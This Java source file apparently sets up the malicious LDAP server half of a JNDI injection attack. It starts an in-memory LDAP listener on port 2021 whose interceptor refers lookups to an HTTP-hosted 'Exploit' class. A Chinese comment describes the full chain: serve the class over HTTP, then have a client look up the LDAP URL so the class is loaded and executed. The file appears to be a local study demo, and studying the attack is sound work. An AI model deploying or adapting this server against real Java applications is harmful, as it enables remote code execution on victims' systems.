package xianzhan.jndi.ldap.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import xianzhan.jndi.ldap.interceptor.OperationInterceptor;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

/**
 * 一共有三个服务(ldap 服务端、http 服务端、ldap 客户端)
 * 1. 启动 ldap 服务
 * 2. 将 Exploit 类放入 http 服务器启动
 * 3. 客户端请求 ldap://127.0.0.1:2021/Exploit
 *
 * @author xianzhan
 * @since 2021-12-19
 */
public class Main {

    public static void main(String[] args) throws Exception {
        // http 服务
        String url = "http://127.0.0.1:7878/#Exploit";

        // ldap 服务端口
        int port = 2021;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }
}
